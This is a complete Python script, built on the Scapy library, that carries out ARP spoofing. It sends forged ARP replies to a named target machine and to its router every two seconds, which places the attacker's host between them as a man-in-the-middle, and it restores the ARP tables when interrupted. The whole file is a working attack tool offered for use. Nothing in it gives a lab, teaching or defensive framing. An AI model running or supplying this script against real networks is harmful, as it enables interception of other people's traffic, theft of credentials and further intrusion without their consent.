from scapy.all import *
import sys
import time

def arp_spoof(dest_ip, dest_mac, source_ip):
    
    packet = ARP(op="is-at", psrc=source_ip, pdst=dest_ip, hwdst=dest_mac)
    send(packet, verbose=False)

def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
    
    packet = ARP(op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip)
    send(packet, verbose=False)

def main():
    if len(sys.argv) < 3:
        print("Usage: sudo python3 arpSpoof.py <Target_IP> <Router_IP>")
        return

    victim_ip = sys.argv[1]
    router_ip = sys.argv[2]
    
  
    victim_mac = getmacbyip(victim_ip)
    router_mac = getmacbyip(router_ip)

    try:
        print(f"[*] Starting spoofing: {victim_ip} <--> {router_ip}")
        while True:
            arp_spoof(victim_ip, victim_mac, router_ip)
            arp_spoof(router_ip, router_mac, victim_ip)
            time.sleep(2) 
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP Tables...")
        arp_restore(router_ip, router_mac, victim_ip, victim_mac)
        arp_restore(victim_ip, victim_mac, router_ip, router_mac)
        print("[+] Done.")

if __name__ == "__main__":
    main()
